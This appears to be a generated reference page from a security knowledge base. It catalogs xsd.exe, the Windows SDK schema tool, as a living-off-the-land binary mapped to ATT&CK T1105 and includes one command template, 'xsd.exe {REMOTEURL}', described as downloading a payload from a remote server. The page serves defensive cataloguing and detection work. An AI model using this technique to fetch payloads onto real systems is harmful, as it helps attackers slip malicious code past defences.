---
parsed_by: focuslocust
source: lolbas
type: generated
---
# xsd.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `xsd.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/xsd.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

XML Schema Definition Tool included with the Windows Software Development Kit (SDK).

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/xsd.md)
- Source verification: [source record](../../sources/lolbas/xsd.exe.md)

## Aliases

- `xsd.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: xsd.exe {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/xsd.exe.md)

## Source Verification

[source record](../../sources/lolbas/xsd.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@AvihayEldad'
Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
Command: xsd.exe {REMOTEURL}
Description: Downloads payload from remote server
```
